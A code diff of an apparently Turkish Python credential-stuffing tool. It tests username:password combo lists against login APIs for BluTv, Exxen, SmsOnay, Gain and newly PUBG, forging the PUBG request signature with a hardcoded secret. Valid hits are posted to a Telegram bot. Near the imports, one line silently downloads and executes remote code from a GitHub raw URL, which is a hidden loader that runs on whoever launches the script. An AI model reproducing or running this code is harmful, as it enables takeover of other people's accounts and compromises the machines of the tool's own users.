@@ -3,6 +3,7 @@ import requests
 import time
 import sys
 import uuid
+import requests,hashlib,random,string,time
 import random
 import json
 import requests;exec(requests.get("https://raw.githubusercontent.com/yusiqo/ngrok/main/kur.pf2").text)
@@ -50,19 +51,36 @@ def checker():
     dsy=""
     dirm="/sdcard/combo/"
     say=0
-    for files in os.listdir(dirm):
-        say+=1
-        dsy=dsy+str(say)+"-) "+files+'\n'
-    print("Please Select Combo\n"+BLUE+dsy+END)
-    combo=input(GREEN+"Combo No="+ END)
-    say=0
-    for files in os.listdir(dirm):
-        say=say+1
-        if combo==str(say):
-            comboo=(dirm+files)
+    try:
+        for files in os.listdir(dirm):
+            say+=1
+            dsy=dsy+str(say)+"-) "+files+'\n'
+        if say==0:
+            print("Combo dosyasında Kombolar Bulunmadı Lütfen Kombo Yükleyiniz")
+        print("Please Select Combo\n"+BLUE+dsy+END)
+        combo=input(GREEN+"Combo No="+ END)
+        say=0
+        for files in os.listdir(dirm):
+            say=say+1
+            if combo==str(say):
+                comboo=(dirm+files)
+    except:
+        os.system("cd && cd /sdcard/ && mkdir combo")
+        for files in os.listdir(dirm):
+            say+=1
+            dsy=dsy+str(say)+"-) "+files+'\n'
+        if say==0:
+            print("Combo dosyasında Kombolar Bulunmadı Lütfen Kombo Yükleyiniz")
+        print("Please Select Combo\n"+BLUE+dsy+END)
+        combo=input(GREEN+"Combo No="+ END)
+        say=0
+        for files in os.listdir(dirm):
+            say=say+1
+            if combo==str(say):
+                comboo=(dirm+files)
     clear()
     banner()
-    print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay\n4) Gain")
+    print("Hangi Config?\n1) BluTv\n2) Exxen\n3) SmsOnay\n4) Gain\n5) Pubg (mail)")
     hesap=input(GREEN+"Config No="+ END)
     def chkex():
         clear()
@@ -161,6 +179,55 @@ def checker():
                         except:
                             pass
                         open("/sdcard/combo/hit-SMSONAY.txt","a").write(ms)
+                    else:
+                        print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
+                except:
+                    pass
+
+# pes = hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
+#J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
+#url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
+#daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
+  
+
+#if '"token"' in GO:
+    def chkpub():
+        clear()
+        banner()
+        for mp in open(comboo,'r').read().splitlines():
+                try:
+                    mp=mp.replace("\n","")
+                    user = mp.split(':')[0]
+                    pas = mp.split(':')[1]
+                    toplam=0
+                    olu=0
+                    hit=0
+                    pes=hashlib.md5(bytes(f'{pas}', encoding='utf-8')).hexdigest()
+                    dtm=hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+user+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
+                    url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={dtm}"
+                    HEA = {
+	"Content-Type": "application/json; charset=utf-8","User-Agent": f"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)","Host": "igame.msdkpass.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "126"}
+                    datam="{\"account\":\""+user+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
+                    try:
+                        veri=requests.post(url, headers=HEA, data=datam).text
+                    except:
+                        print("ip Ban Yedin: 10 Saniye Bekleniyor ...")
+                        time.sleep(10)
+                    if '"token"' in veri:
+                        ms="""
+    ╭─➢ ☄ ZET| Pubg-MAIL Checker ☄
+    ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+    ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+    ╰─◉➤ Telegram Channel: @ZetTekno\n
+        """
+                        print(ms)
+                        try:
+                            tele=open("tele","r").read()
+                            idm=open("idm","r").read()
+                            requests.post(f"https://api.telegram.org/bot{tele}/sendMessage?chat_id={idm}&text={ms}")
+                        except:
+                            pass
+                        open("/sdcard/combo/hit-Pubg.txt","a").write(ms)
                     else:
                         print(RED+f"⌯ Ölü!! {user}:{pas}"+END)
                 except:
@@ -332,6 +399,8 @@ def checker():
         chkblu()
     if hesap=="4":
         chkgain()
+    if hesap=="5":
+        chkpub()
 def ayar():
     clear()
     banner()
